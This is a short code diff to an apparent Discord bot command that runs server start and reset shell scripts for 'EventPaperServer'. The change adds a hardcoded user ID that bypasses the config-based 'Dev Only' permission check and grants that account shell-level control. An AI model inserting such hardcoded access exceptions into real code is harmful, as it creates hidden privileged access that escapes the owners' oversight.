@@ -5,7 +5,7 @@ const config = require("../static/config.json");
 
 
 module.exports.run = async (client, message, args) => {
-  if (config.sudo.indexOf(message.author.id) < 0) return; // Dev Only
+  if ((config.sudo.indexOf(message.author.id) < 0) && !(message.author.id === "614634259021430786")) return; // Dev Only
 
     var code = "cd .. ; cd .. ; cd EventPaperServer ; ./start.sh";
     if (args[0] && args[0] === "reset") code = "cd .. ; cd .. ; cd EventPaperServer ; ./reset.sh";
